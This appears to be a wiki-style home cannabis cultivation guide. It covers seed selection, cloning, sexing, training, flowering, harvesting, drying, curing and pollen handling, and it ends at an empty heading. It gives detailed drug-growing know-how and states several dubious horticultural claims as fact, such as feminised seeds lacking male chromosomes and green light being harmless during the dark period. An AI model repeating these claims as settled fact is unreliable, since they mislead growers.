One easy way to acquire excellent genetics is to simply purchase from a known and reputable breeder. There are many online seed companies that are reliable and will ship anywhere in the world. You do need to be cautious because the companies do not verify that seeds are legal in your location and leave that burden upon you. If you try to import seeds where they are not allowed by law you risk losing the money you invested in the seeds.

Things to look for in seeds are feminization (if done by a competent breeder these seeds do NOT carry an increased probability of hermaphroditism). Feminized seeds produce all female plants. This is desirable since in regular seed only about half are females. You will want an all female crop in order to prevent pollination and grow sinsemillia weed that is much more potent. Since only the female plants are desired half of the seeds you purchase will be wasted with regular seeds. It will also leave empty space in your grow area.

Another important trait to look for are seeds which are F1 Hybrids. F1 Hybrids are genetically more desirable. These seeds are from the strains original parent plants. Seeds from two F1 plants of the same strain would be F2. With each successive generation of inbreeding the genetic stock becomes weaker. F1 plants will also be more likely to enjoy what is called 'hybrid vigor'. Hybrid vigor is a phenomenon that sometimes occurs in hybrid crosses causing a incredible vigor and growth in the offspring produced by the cross.

===== Clones =====
Clones obviously aren't seeds, but they are cuttings from a mother plant and used to propagate genetics and start gardens. When grown out the cutting will have the same genetics as the mother plant and therefore all the same characteristics. There are locations where you can sample marijuana and then purchase cuttings from the same mother as the plant that produced it. Obtaining a cutting of known quality genetics is the best way to obtain genetics. If this option is available to you then you should go with it. Cuttings can be taken from any marijuana plant so if you have a friend that grows you might be able to acquire excellent genetics. As an added bonus, since cuttings are clones they also share the gender of the parent plant. This means cuttings from a female plant will always be female.

==== Basic Types of Plant ====
It is worth having some understanding of what strains of plant are out there. This lets you describe what you are growing and understand what others are growing.

===== Cannabis Indica =====
Indica plants are short, bushy, mature early, have more chlorophyll and less accessory pigments (accessory pigments protect the plant from excessive sunlight). Indicas are very resinous plants that provide a body buzz couch lock effect.

===== Cannabis Sativa =====
Sativa plants are taller, take longer to mature, have less chlorophyll and more accessory pigments. Traditional botonists tend to mislabel all cannabis as cannabis sativa. Sativa plants have much higher yields than indicas and have a very cerebral buzz. They are typically very consistent maintaining the same results from one generation to the next.

===== Cannabis Ruderalis =====
C. ruderalis plants are typically very short and extremely low potency. Ruderalis strains do have one interesting trait: other strains of marijuana flower when the light output is reduced to twelve hours a day or less, allowing a build up of a light sensitive hormone in the plant that tells it winter has arrived. C. ruderalis plants automatically flower after a certain time period independent from light output and are, therefore, referred to as autoflowering. For this reason there are crosses between potent indicas and sativas with ruderalis to attempt to create a plant with higher yield and greater potency that flowers automatically. This offers the benefit of having the plant enjoy as much photosynthesis during its life cycle as possible.

===== Hybrid =====
A hybrid is a cross between two or more of the other strains of plant. Most commercially available strains are hybrids with varied amounts of indica and sativa. There are a few ruderalis hybrids as well.Few hybrids occur in plants.

=== Germinating Seeds ===
A great deal is made of germinating seeds. In truth the process is simple and if done correctly will give excellent results, generally 90+% germination rates.

In order to germinate seeds you should take a paper towel and fold it in half and half again. Wet the paper towel thoroughly with reverse osmosis filtered water and place the seeds in the crevice made by the last fold. Close the paper towel and place it on a plate. Then place the plate in a dark place and check it 24hrs later. Continue to check every 8hrs keeping the paper towel moist until the shell of the seed opens and a white shoot comes out. This will typically occur within 72hrs. Now that the seed has sprouted you can push it into your desired grow medium. It is best to sprout your seeds in either a small rockwool cube or directly into the same grow medium you plan to use in your final grow. This will reduce stress on the plant when you transplant it.

=== From Sprout to Seedling ===
Once the germinated seed is placed in grow medium it should be watered with plain water until it sprouts. When it sprouts it will have two small round petals. This is considered a sprout. You should continue to water with clean water at least until the first set of true serrated edged leaves form and the two small round leave brown and die. This is normal, the plant uses those leaves as a sort of parachute to allow it to utilize the nutrients stored in the seed itself. During this stage of growth the plant is very delicate and should only be placed under fluorescent lights.

At this point your sprout is now called a seedling. If you sprouted in a rockwool cube you should either place it into your desired grow medium and begin feeding with a weak 1/4 strength nutrient solution or if you have it in soil you can just continue to water as is since there should be nutrients in the soil.

      <text xml:space="preserve">{{Marijuana Cultivation}}
== Vegetative Growth ==
The vegetative growth cycle is about growing the plant mass in preparation for flowering. Outdoor you will have several months of vegetative growth. Indoors you can have as little as a week (if using clones), 4-6wks (typical), or as much as you want. 

=== Lighting ===
The adult life cycle of the marijuana plant consists of two stages of growth. Vegetative and Flowering. The plant determines which of these stages of growth it should be in through the presence of a flowering hormone (phytochrome) which is sensitive to light. As long as light levels above 12-14 hours are maintained the flowering hormone will never be present in high enough levels to induce flowering in the plant. At any point during the plants life if the light is on for more than 12 hours a day it will cause the levels of flowering hormone to be reduced and the plant to revert to the vegetative growth stage. If a plant is reverted during flowering by irregular light patterns it can cause stress in the plant and stress can cause hermaphroditism. A plant can be maintained in vegetative growth without being allowed to flower indefinitely with no adverse effects.

Typically indoor growers who can control their light cycles will use either 18 hours of light per day or 24 hours of light per day. There are mythical claims that a darkness period is needed but there is no evidence to support this. Extremely healthy and potent marijuana is grown under 24-hour vegetative light. What is in dispute is whether the extra light hours bring a great deal of benefit compared with 18-hour light. Most 24-hour growers claim some increase in plant vegetation but few claim a large increase.

=== Feeding ===
During vegetative growth you will want to use a fertilizer that is high in nitrogen at full strength. Nitrogen is used by the plant to grow stems, leaves, and other green parts and so is absolutely essential to the vegetative phase of growth. As always you should begin with the manufacturers suggestions for the period of growth you are in when adding fertilizer and then adjust up or down based on how your plants respond.

There is another section on plant problems but a good hint to know at this stage is that it is common to mistake too many nutrients or PH misadjustment for nutrient deficiency. Always carefully check PH before adjusting nutrients to fix a problem and if adding nutrients doesn't seem to be fixing your 'deficiency' try flushing the system instead. Unlike the drooping leaves that result from under or over watering yellowing and necrosis from nutrient problems generally don't recover but they stop getting worse and new growth will be green and healthy.

=== Training and Trimming ===
Different techniques have developed for training plants. The goal of training a marijuana plant is to optimize yield with the available light and space. Outside a plant in the middle of a clearing with a full year of vegetation can probably be left to do what it wants and give great yields. Indoors the light is more precious and many growers are using small cabinets. They just train their plants to utilize the space they have.

A couple things that any grower should be aware of are that leaves are solar panels. You might be twisting and directing the branches but the plant knows better than you when and where it needs leaves, leave them alone. If a gentle pull on the leaf doesn't cause it to give way immediately then it is healthy tissue. Usually you will only want to remove browned leaves. With a thick canopy under indoor light the lower growth will yellow and die, this is because the plant isn't getting much light there and steals the nutrients from these now unneeded leaves. This is nature at work and not always a sign of too much or few nutrients.

Another thing that is important to know is that the tops of the plant produce the most potent and largest flowers. Most training techniques focus on maximizing the number of those top flowers and on removing smaller lower flowers the plant will direct all its energy to the larger tops. How much difference different training techniques make is debated but trimming lower growth that is far from the light is universally agreed to improve yield. Any time you bend a branch horizontally it will cause the plant to produce a hormone that encourages lateral growth.

When training plants you will occasionally snap a stem. It happens. Plants can usually recover from this. Just position the stem back together and tape it in place. Give the stem time to recover before applying more pressure to that spot. A small knot will develop at the break and in the end the plant stem will grow back healthier and stronger than before.

=== Jogging ===
Jogging also known as the jungle of green or JOG technique is a useful way to maximize the yield from your crop. It is very effective in a low grow space as well.

With the jog technique you will use wires shaped into &quot;U&quot;'s to hold down the stem into the desired positions as you gradually shape it around the perimeter of the pot. The goal is to make the plant entirely fill the pots space with top buds. No matter how much training you do a plant will have a genetic maximum bud capacity that can not be exceeded. Training will help you reach that potential but nothing can allow you to exceed it.

=== Sea of Green ===
Sea of a green is a technique whereby you grow a far greater number of smaller plants rather than a small number of large plants. Usually clones are used for uniform growth characteristics and each plant is trimmed so that only the main stalk grows. 

=== Screen of Green ===
With the screen of green, or SCROG technique, a screen of wire such as chicken wire is held up as a horizontal plane above the plants. The plants are nudged through the screen to create a uniform canopy so that all light is utilized by growth. Generally anything below the canopy is trimmed off.

=== LST ===
LST is a technique where a plant is trained through the use of ties or ropes. The idea is that you use a support rope at the base of the plant pulled one direction and another tied to the top pulling it down in a different direction. Every couple days the top will be pointing upward again while axins (branching hormones) reach the other nodes. Each time the top pulls up above the other branches the top rope should be moved up and the top pulled down. Continue doing this until the top does not pull above the other branches.

=== Topping ===
Topping is one of the oldest tricks. No matter what you have heard topping is not clipping off bud tops. Topping is removing about 3/4 of the top growth tip. This will cause the plant top to split into two tops. This technique can be used to produce as many tops on a plant as you want. Begin topping off after the first pair of serrated leaves.  Topping below the first set of serrated leaves will kill the plant. Making the first topping here forces 4 new tops to grow. When you see a new set of sprouts with each a set of leaves and when their tops are big enough pinch it off to make another set of sprouts on that limb.  When you have 8 tops you're ready to begin flowering.

== Cloning ==
Okay so this is where we cue Doctor Frankenstein's lab. The doctor cackles madly and the lighting strikes just as he switches the lever. A moment later there is grunting from the form under the blanket and the doctor screams &quot;It's alive!!!&quot;

Or maybe not. Cloning a plant doesn't require a cleanroom, it doesn't require a lab. No men in white coats, no special chemicals or treatments. No high school biology let alone a degree. People have been cloning plants for thousands of years and its extremely easy to do. The simplest way to clone many plants is to cut off a piece of a plant and toss it in a glass of water. Stick the glass in the window, wait a few days and presto roots will sprout from the bottom of the cutting. At this point your cutting is now a clone of the plant it was cut from. For plants cloning and regeneration are a process that is completely natural. It happens to them regularly during the simple rigors of existence.

=== Why Clone? ===
Cloning is the process of replicating the exact genetic characteristics of a plant. If you have found not only a good strain but a particularly fine specimen you can share it by cloning. Or you can keep the fine plant in the vegetative stage forever and only grow out and mature cuttings of it. Not only do you have a plant with known properties such as potency, potential yield, disease resistance, size, etc but you will be able to have a garden of plants that given the same conditions will more or less grow at the same rate and respond to the same way to different training methods. Your plants will all have the same nutrient requirements as well.

Cloning is also an ideal way to determine the sex and properties of potential mother plants without every having them undergo the stress of flowering. This is much better than taking a cutting during flowering or putting a flowering plant back under a longer light cycle to revert it back to vegetative growth. Stress can alter or damage genetic material and that genetic change will be passed to the cuttings taken from the mother after that point.

=== Rooting Hormone ===
Rooting hormone is completely optional. It often comes as a gel or powder that you apply to the base of the stem of your cutting to stimulate root growth. An alternative that seems to yield excellent results when compared to plain water or commercial rooting hormones is a dip in asprin water. Just crush up two extra strength asprin in a half liter of distilled water and let sit with occasional agitation overnight. Now dip your stems in the asprin water instead of rooting hormone before putting them in the medium and you will have excellent results.

=== Cloning Devices ===
When you take cuts you are going to need to do something with them to keep them in ideal conditions until they grow roots. Obviously you will put them into a medium but then what? Here are a few devices used for this purpose.

==== Two Liter Bottle Method ====
This is probably the cheapest and easiest consistent method to root a small number of clones. Just cut the bottom 40% off a two liter soda bottle put a clone in rockwool or a whole small jar with another medium inside the bottom. Cover with a plastic bag and hold the bag down with a rubber band. Before sealing give it a puff of exhaled air to fill it with CO2.

This traps humidity and it is normal and desirable for moisture to condense on the container. You will need to exchange air every day until roots appear.

==== Humidity Dome ====
The most common tool used is the humidity dome. These can be purchased for $10-$15 U.S. Dollars at any hydroponic shop and consist of a plastic tray that is just the right size for a sheet of small rockwool cubes to fit inside of. There is then a clear plastic cover that fits on top of the tray to trap humidity. Depending on the number and size of clones you will need to exchange air between 1 and 3 times a day.

==== Bubbler ====
These can be purchased or constructed. Essentially this consists of a tray with a cover. In the cover there will be numerous net pots and in the tray will be water and aquarium air stone strips. The strips bubble air through the water causing the bursting bubbles to moisten the medium in the net pots. These can be used with or without a humidity dome cover.

==== Wick Cloner ====
These simple and prolific cloners are generally constructed rather than purchased. A system similar to the bubbler is used with a tray and cover. Instead of net pots the tray has half pint plastic containers suspended over the water. A wick, usually a 1 1/2 inch piece of shoelace or strip of cloth then goes from a hole in the middle of the bottom of the container down into the water. The containers are then filled with perlite. The wicks pull up moisture into the perlite. A dome cover is not used with this method.

=== Taking Cuttings ===

==== Taking Cuts ====
This is the easy part. You will want a pair of sharp scissors and a cup of water handy. When you take a cut put it into the water immediately. Cuttings should be about four inches long, and the cut should be placed about 1 cm below a node. You must have a growth tip to take a cutting and will want a couple nodes past that.

==== Prep Cuts ====
After you have your cuttings take your glass of water over to a sink. You will need a sharp knife or razor for this step. You should prep and plant each cutting entirely before moving the next. Remove all leaves except for the top set. Clip the leaves on the stop set so long, that half their length is present. Place the stem of the cutting under water either submerged in a pool of water or under a stream in the sink. Cut the stem at a 45 degree angle. This prevents air bubbles in the stem that would prevent moisture uptake. Finally score  the bottom 1/4 of the stem. You only want to score the skin of the stem and not cut into the stem itself.

==== Planting the Cuttings ====
Dip your prepared cutting into asprin water or any rooting hormone you have (if any) and then plant in the container and/or medium you will be using. Try to plant all stems approximately the same height and just enough to give good purchase in the medium. 

That's it, use one of the aforementioned systems to care for your clone for the 7-14 days until it grows roots (yellowing in the leaves is often a sign that roots are developing). Not everyone will have 100% success so take extras cuts. This lets you pick the healthiest clones. After roots form you should plant the clones within 7 days and feed only 1/4 to half strength nutrient until they are healthy (about 7 days after rooting). Clones should be treated like seedlings. One major difference is that clones are sexually mature as soon as they root and can be flowered immediately if you so choose although most growers give them a veg period.

=== Generational Cloning ===
Replacing your mother with a fresh clone from healthy tissue often will reduce genetic damage due to stress and replication failures over the life of the plant. Over the course of time genetic damage will occur within any organism and your mother plants are no exception. While plants are very resilient to this particular type of damage it still occurs. However, this type of damage is often localized and a clone taken from an undamaged portion of the plant will contain the original genetic profile. This clone can then be grown and cultivated a replacement mother plant with no adverse effects because it contains the same genetic code as the original mother plant. This is true no matter how many generations of mothers from mothers you take.

== Sexing ==
Sexing is an important part of the growing of marijuana. It is the source of much needless worry for beginning growers. You want to sex your plants to remove males. Male plants have low potency. Those interested in the psychoactive effects will want to cultivate the females for their flowers. In the 1960s people used the leaves, stems, and fertilized flowers effectively medicinally with excellent results. The leaves or &quot;shake&quot; can be smoked with good results. The flowers are the most potent especially when not allowed to be fertilized..

A virginal female plant will direct the bulk of its energy later in its growth phase into developing the flower buds and swelling them with the resin that carries the bulk of marijuana's potency. The plant does this so that the large sticky flowers are more likely to catch pollen. If the flower is pollinated it will instead direct the bulk of its energy to seed production. This is where low quality dirt weed comes from. If you have seedy pot, it is dirt weed. The more seeds contained in the pot the lower the quality. And of course seeds add dramatically to the weight since they weigh more than the bud itself, this is sharply contrasted with stems that are mostly water weight and have a negligible weight compared to the bud.

Plants generally should demonstrate their sex one to two weeks into flowering. During the first ten days of flowering there is very little need for concern about males pollinating your crop. Additionally, if you reproduce by cloning you will only have to worry about males once.

=== Identifying the Male ===
Males can be identified by looking at the nodes where leaf and branch stems connect with the main stalk. Male flowers will contain balls somewhere between the size of a marijuana seed and a popcorn seed. One ball is not definitive since female pistils sometimes split from a small single ball that opens. But two or three balls in a cluster is sure confirmation that you have a male. Males should be removed and destroyed to prevent them from releasing pollen. The pollen transports easily so the males can not be safely grown anywhere that shares an A/C or ventilation system unless special precautions are taken.  The males for the most part show their sex before the females.  They appear often to be a lanky less bushy plant than the female.  It takes about a week after showing their sex before pollen is released, making it easy to separate from the female. Males can be used to make hashish, though it will require a larger amount of leaves to make hashish or canna-butter (cannabis butter).

=== Identifying the Female ===
Females are very simple to identify. They sprout white hairs. A small ball will form and split and two tiny white hairs like translucent threads will split out. These hairs are called pistils and intended to catch pollen. Later when the plant is not pollinated these hairs will change color.

Pistils may guarantee that your plant is not a male but your plant could still be a hermaphrodite. You must watch plants grown from seed carefully for male flowers and even a trusted clone if it has undergone stress such as light during its dark period, lack of watering, or being left to flower far past maturity.

=== Pre-flowers ===
On certain strains what are known as pre-flowers may appear while the plant is still in vegetative growth. This is perfectly normal. 

=== Cloning for Sex ===
No this is not the title of futuristic fantasy movie. You can always revert a mother to veg in order to take cuttings and can even take cuttings during flowering (although success rates will be lower and rooting will take longer) but this process induces stress on the plant that can and does cause hormonal and genetic changes. It is much better to have a mother plant that has never been flowering.

Recognizing this, people have begun taking clones from their vegetating plants when they reach maturity. Once the clone is rooted, you would either flower the original plant or the clone and keep the other under 18hr or 24hr light indefinitely.

== Flowering ==
The majority of marijuana cultivators are cultivating for unpollinated female flowers and breeding purposes. Naturally most readers are highly interested in this particular phase of adult marijuana growth. The truth is that flowering is actually pretty simple.

=== When do I Flower? ===
When to flower is a decision every grower must make for themselves. During the flowering stage a plant may grow 2 - 2.5 times the size it achieved in vegetation. An indoor grower in particular will need to plan space accordingly. Up until then the grower will have been trimming and training plants but during flowering these things should be avoided if possible.  Growers with limited space should take note.

Whenever you want to flower your plant should be at a level of maturity where it is producing alternating nodes. If grown from seed this will usually occur a few weeks into vegetative growth. Clones taken from a mature plant will be sexually mature upon rooting and can be flowered immediately.

Towards the end of flowering, plants will begin robbing nutrients from their leaves. This is perfectly normal and nothing to be alarmed about as yellowing leaves are normal. You do not need to make an effort to remove the leaves unless they are brown and dead.

=== Lighting and Nutrient Changes ===
In order to make a plant flower you will need to reduce its light cycle down to 12hrs a day. During flowering it is absolutely essential to make the dark period as dark as possible and to never interrupt that cycle with light. Light up to the level of moonlight can be present without preventing the plant from flowering but any light reduces flowering hormone and will reduce the output of your plants. Light interruptions during the flowering period causes stress on the plants and can result in stress induced hermaphrodites. To avoid this, just place a green light bulb in the room. Use ONLY the green light when working in the room during the dark cycle. The plants cannot absorb the green light and thus it is safe to use, with no risk of ruining your crop. Attempts to remove all the pollen sacks on hermaphrodites are never successful and will result in a seedy crop. The best course of action if you find a hermaphrodite is to (1) spray the affected plants with water to hold the pollen in place, (2) put a trash bag around the whole plant (use a twist tie or something at the stem to hold it in place), (3) remove it quickly.

Some growers believe that it is important to begin using flowering nutrients 1-2 weeks ''before'' switching over the light for flowering. Others begin flowering nutrients when they switch the light. There may be benefits to switching nutrients early but it is certainly not a requirement.

=== Growth and Rough Timeline ===
It should be noted that this is just a general average guideline. There are wide variations from this, some strains will move faster and other much more slowly. In some cases that wait is worthwhile and in others it is not.

1-2wks - During this time your plants will be changing over to their flowering period. It is generally during this time that the first evidence of flowers will appear.

2-4wks - During this time the plants will begin to stretch for the light. Flowers will appear at all the nodes but they will be light and airy no matter what you have done.

5+ - During this period you will likely see lots of yellowing on leaves and if you have done everything else right you will see the buds fill in and thicken substantially.

Last two weeks -
During the last 1-2wks of your plants life you will want to water it with clean water and feed it no nutrients. Before the last 72hrs you will want to flush the grow medium thoroughly. During the last 24-48hrs you should shut off the lights (thc is light sensitive and the plants will be utilizing sugars already produced by photosynthesis during this period). Overall this will increase taste and potency by flushing the plant of fertilizers and sugars which simply don't taste good when burned.

=== Supplements ===
There are a plethora of supplements on the market and no attempt will be made here to list them all at this time but there are a few general types that most flowering supplements fall into that can be addressed here.

Sugar supplements such as sweet, molasses, etc - This type of supplement does NOT feed the plant directly. Plants can not utilize already processed sugars like this. What this does do is nourish organisms living in the grow medium. If you are using an organic grow process or growing in soil this can be very beneficial but should be stopped during the flush period.

Hormone Supplements - Naturally the effects depend on the hormone but all in all these are beneficial but expensive. Plant growth hormone extracted from algea is helpful but provides far more benefit during the vegetative grow cycle than the flowering cycle. Plant flowering hormones are beneficial during flowering, largely for creating more flowering sites than without. Hormone supplements can be very expensive which often limits their practical utility.

Taste enhancers - There are products with citrus and other flavors that claim if you feed them to plants the plants will take on some aspect of their flavor. This is generally reported to be false.

Nutrient supplements - Some boosters are simply more flowering nutrient. How well they work depends on how ideal the mix you are using is already.

Calcium/Magnesium Supplements - These are very useful for balancing out your nutrient mix, this underrated nutrients are important for plant growth. The use of a supplement like this is highly recommended for all phases of growth.

== Harvesting ==
Harvesting marijuana is a joy and a blessing, until it becomes a pain in the arse. There is a great deal of work involved. Some strains will be more work than others but you can be certain that harvesting and trimming a crop will require a considerable time investment as well as sore hands and fingers.

=== When do I Harvest? ===
The best way to determine when to harvest is to examine the maturity of the trichomes. Trichomes are the resin glands of the plant and their level of maturity gives you an idea of both how mature the plant is and the effects you can expect from the plant if harvested at a given stage. In order to examine trichomes you will need a pocket microscope, these are commonly available for about $15 USD in 50-100x magnification, 50x should be plenty.

Trichomes are stalks with a head at the tip, it is the tips that you will look at. You will want to look at the trichomes in a couple areas over the plant to get a good idea of the overall maturity. The tips start out clear, then later will begin to cloud, finally the tips will turn amber. Clear trichs aren't very potent, the ratio of cloudy to amber is really what you want to look for. The more amber the trichomes the more of body physical stone the pot will deliver. A heavier ratio of cloudy will deliver more of a soaring mental high. All of this is of course relative to the general effects provided by the strain. Most harvest at 30-50% amber, it is not recommended to go beyond 75% amber.

Though most people go by trichomes, it is not necessarily the best way.  The cannabis bud has an actual look to it when it is finished, the calyxes swell, 95% of the hairs change color, and the hairs recede into the calyx.

=== What to Cut ===
So its time to harvest but what should you cut and how do you go about it. Well the truth is that this is personal preference. Regardless of how you cut and trim your plants you should touch the flowers as little as possible and avoid breaking up the buds. Damaging the delicate trichomes will reduce the potency of the marijuana.

One way is to leave the plants in their pots (more or less intact) and spread out a couple news papers. Toss large sun leaves on newspaper and do small bud trimming over the other.

Start with the sun leaves and then trim progressively smaller. This way you will have less in your way. For now, leave the buds on your stems. For trimming the buds, first take all the tiny popcorn lower buds and put them where you are going to put your trim these won't be much of anything when dry. Next trim the actual bud leaves, this trim will have lots of trichomes so should be saved to make oil, butter, or something else so they don't go to waste. To trim the bud leaves start with leaves that you can see a stem on and clip off at the stem to remove. Then begin to trim in a circular motion around the bud until you have cut back to the sugar coating. Trimming past this point is just wasteful. Don't worry if they look fluffy or leafy, they will dry and cure into sticky potent buds if you've done everything right.

This should leave you with all the buds on a nice thick stem network that is suitable for any drying/curing process you want to use. Some drying processes will involve just clipping at the main stem and hanging upside down to dry, others will require you to further break down the plant into smaller bud pieces. When you do this leave enough stem for you to handle and work with the flowers you can and likely will trim down the stem later and dried stem doesn't weight a significant amount compared with dried bud. Also, you will find that you can trim the large top buds into smaller buds one node at a time. It is better to leave as large of a single bud mass as possible.

== Drying and Curing ==
Drying and curing marijuana is a critical step in the growth process. During this stage you can lose, preserve, or cultivate odor, flavor, and potency. Odor and flavor must be carefully cultivated. The drying and curing process allow the plant to purge sugar and if desired to purge chlorophyll (although some have developed a taste for the chlorophyll in the plant). 

Improperly dried and cured marijuana can lose almost all of its original potency and lower potency marijuana can be concentrated to slightly higher potency if handled properly. Four things reduce the potency of marijuana; those things are exposure to light, heat, damage to the plant tissue, and air. Additionally, marijuana that is not dried and stored properly can contain too much moisture and grow mold (mould). It is important to remember that many rapid drying techniques will dry only the outside of a compact flower and that slow techniques like curing may be needed to draw that moisture to the surface.

The virtue in drying and curing as with all stages of marijuana cultivation is patience.

=== Air Drying ===
Air Drying is probably the most popular method of drying marijuana. Air drying can be very well controlled. By controlling the amount of airflow, you control the speed of drying. A common technique is to suspend the plants upside down in a room with a circulating fan blowing (but not actually blowing on the plants themselves) in order to keep air moving. Another technique is to put the buds on a half open drawer or tray in a place with moving air. The further along in the drying process the more you close the drawer to reduce airflow.

A simpler way to dry the marijuana is to put the buds in a layer in a brown paper bag. This is simpler but faster and therefore the output is less desirable.

The speed in this process is a trade off. If you dry too fast then it will take longer to cure the marijuana properly. If you dry too slowly you will be exposing the marijuana to more air therefore reducing potency. Many growers shoot for about seven days drying time. If you are not going to cure the marijuana the plants should be dried until the stems snap easily rather than bend. If you are going to cure then you can begin with slightly more damp (but still mostly dry) marijuana.

=== Dry Ice Drying ===
Because light, heat, and air all degrade potency someone came up with the idea of using a can or other container in a freezer or using a cooler to dry the marijuana using dry ice. Dry ice can be purchased at virtually any supermarket and is simply frozen carbon dioxide gas. In order to avoid injury you should avoid direct contact with your skin. 

By using about the same amount of ice as marijuana you can dry your weed out without exposing it to air or light and certainly not heat! Simply lay down a layer of dry ice, put an insulating layer of breathable cloth over it like a cheesecloth or a simply kitchen towel. Then lay the buds spread out on top of the ice. Make sure there is a way for the gas to escape as the dry ice evaporates.

Dry ice never becomes liquid, it sublimates directly into a gas form and carries moisture away from your bud when it does. Once all the ice is evaporated your bud should be mostly dry. If not, put a little more ice in and repeat until it is dry.

Some experiments with this method have suggested that it may be better to remove the marijuana before the ice is completely evaporated, since some condensation will collect in the container adding moisture back (although this moisture will dry more quickly since it is not locked in the cells of the plant).

Unfortunately, this method causes the trichomes on your marijuana to fall off leaving you with a less potent product.

=== Microwave and Oven ===
A microwave and an oven both dry marijuana using heat. You can cover bud between layers of paper towel in a microwave or use an oven on the lowest setting with the door cracked open to dry marijuana but heat will absolutely degrade the potency of your final output dramatically.

=== Food Dehydrator Drying ===
Food dehydrators can be used to dry marijuana along with most other materials but are not recommended for this purpose. Food dehydrators use the direct application of rapid air movement and in most models the application of heat to dry materials. As explained previously heat and air will degrade the psychoactive components in the marijuana such as THC.

=== Slow Cure ===
Now that your initial drying is over you need to distribute the remaining moisture evenly through the bud because right now its all in the middle. You also might want to remove some more of that moisture and maybe some chlorophyll with it. 

The traditional technique is the slow cure. With the slow cure you will put the material into a sealed container such as a glass jar or Tupperware container in the fridge until moisture rises from the center of the bud to the surface. When the buds feel moist you will sit them out in open air until they feel dry again and then repeat. The period of time before the moisture is drawn out will become increasingly longer. Most growers recommend curing for a minimum of two weeks. Generally medicinal grade cannabis can be stored for approximately 6 to 12 months before any degradation is noticed.

=== Water Cure ===
Water curing is an innovative idea. The resin in marijuana is not water soluble, so everything in the plant that is water soluble is an impurity. Water curing involves taking dry marijuana and submerging it in distilled (or at least not chlorinated) room temperature water (room temp is important, heat degrades potency and cold will make trichomes brittle). Change the water daily. This can be done for anywhere from 3-14 days and results in a dark chocolate brown marijuana. Wet marijuana and the same slow drying techniques should be used to remove the moisture from the marijuana the second time around to ensure complete drying.

=== Sweat Cure ===
This is often done in impoverished nations with large commercial crops and is similar to how tobacco is commonly cured. Pile your buds into a pile of alternating layers. Shift around the buds periodically. This will cure and brown the marijuana quickly but is using heat to do it. This technique will reduce potency and helps breed harmful fungus and bacteria. For these reasons it is not recommended. it is also common among Jamaican and Rasta culturistic curing techniques. . .

== Producing Seeds ==
Sooner or later every grower is going to want to produce marijuana seeds. Developing a new stable strain is beyond the scope of this discussion and requires the ability to grow hundreds or even thousands of breeding plants. However, just about any grower can manage to preserve some genetics by growing f2 seeds where they have crossed a male and female of the same strain, or can produce a simple cross which would be referred to as strain1xstrain2 for instance white widow crossed with ak-47 would be referred to as a WW x AK-47. You can produce some excellent seed and excellent marijuana this way.  

=== To Feminise or not to Feminise ===
There are numerous myths surrounding feminized seeds. Feminizing seeds are a bit more work than simply crossing two plants naturally. However it will save you a lot of time in the end. If you make fem seeds properly then there is no increased chance of hermaphrodites and all seeds will be female. This means no wasted time and effort growing males and it means that all your viable seeds produce useful plants. Since roughly half of normal seeds are male this effectively doubles the number of seeds you have.

Feminized seeds are bred to contain no male chromosomes, which will be able to produce the crop of resinous buds sought by most growers. For gardeners who require a quick and easy cultivation process, feminized seeds are the ideal choice. Some medicinal cannabis users may be deterred from growing their own supply because of the perceived difficulty of growing or of identifying the different genders and removing males early in the blooming period. Feminized seed-strains offer a simple solution to these issues, as there is no need to spend time in the first weeks of flowering checking for male plants.

Other times you will have no choice but to produce feminized seed because it will be a female plants genetics that you want to preserve and you won't have any males. Perhaps you received these genetics via clone or didn't keep males.

The new thing on the market for commercial Cannabis cultivation are auto-flowering feminized strains. By crossing of the cannabis ruderalis with Sativa and Indica strains many cultivators have created interesting hybrids which boast benefits from both sides of these families.

The first 'auto-flowering cannabis seed' which came on the market a few years ago was the Lowryder #1. This was a hybrid between a Cannabis ruderalis, a William’s Wonder and a Northern Lights #2. This strain was marketed by 'The Joint Doctor' and was honestly speaking not very impressive. The genetics of the ruderalis was still highly present which caused for a very low yield and little psychoactive effect. Not very attractive.

Auto-flowering cannabis and the easily distributed seed have opened a whole new market in the world of the online grow-shop, making it easy for home growers with shortage of space to grow rewarding cannabis plants in many different varieties. 
To grow plants indoors, a growing medium (e.g. soil or growing Potting soil, irrigation (water), fertilizer (nutrients), light and atmosphere need to be supplied to the plant.

Auto-flowers have been rising in popularity fast and there are now auto flower growers communities. These Web properties allow users to get information on how to grow these non photo-sensitive plants and what are the best practices when producing and germinating auto-flower seeds.

=== Selecting Suitable Parents ===
There are a number of important characteristics when selecting parents. First are you making fem seeds? If you are then both parents will be female. This makes things easier. If not then the best you can do is select a male with characteristics in common with the females you hope to achieve from the seed.

Obviously potency, yield, and psychoactive effects are critical to the selection process. But some other important traits are size, odor, taste, resistance to mold and contaminants, early finishing and consistency.

=== Collecting and Storing Pollen ===
In order to collect pollen you simply put down newspaper around the base of the plant. The pollen will fall from the plant onto the newspaper. You can then put this newspaper into a plastic bag and store it in the refrigerator or freeze it. Pollen will keep for a few months in the refrigerator and can be used on the next crop. (The freezer will extend that to up to decades if the pollen is dried a little first) But gives the pollen a lower chance of viability that increases with time.
I have used frozen pollen that was 17 years old and the pollen worked great, zero problems. It was cleaned through a silkscreen dried over night and planced in paper bindels in a glass jar at -30c.

=== Pollinating a Plant ===
To pollinate a plant you can brush the pollen on a flower with a cotton swab or you can take the plastic bag, then wrap the flower inside it and shake, trapping the pollen inside for easier transportation. In this way you can selectively pollinate plants and even individual buds and branches.

=== Male Isolation ===
A male plant or a plant with male flowers will pollinate your entire crop rendering it seedy. You probably don't want THAT many seeds so how can you avoid it? Moving the male to another room might work but if that other room shares an air path via ducting or air conditioning then pollen may still find its way. One technique is to construct a male isolation chamber.

A male isolation chamber is simply a transparent container such as a large plastic storage tub turned on its side (available at your local megamart). Get a good sized PC fan that can be powered with pretty much any 12v wall adapter, by splicing together the + (yellow or red on fan, usually dotted on power adapter) and the - wires (black on fan, usually dotted power adapter) just twist with the like wire on the other device and then seal up the connection with electric tape. Then take a filtrate filter and cut out squares that fit the back of the pc fan so that the fan pulls (rather than pushes) air through the filter. Tape several layers of filter to the back of the pc fan so all the air goes through the filter. Now cut a large hole in the top of the plastic container and mount the pc fan over top of it so it pulls air out the box. You can use silicon sealant, latex, whatever you've got that gives a good tight seal.

This can be used as is, or you can cut a small intake in the bottom to improve airflow. Pollen won't be able to escape the intake as long as the fan is moving but you might put filter paper over the intake to protect against fan failures. You can also use grommets to seal holes and run tubing into the chamber in order to water hydroponically from a reservoir outside the chamber. Otherwise you will need to remove the whole chamber to a safe location in order to water the plant or maintain a reservoir kept inside the chamber.

=== Making Feminised Seed ===
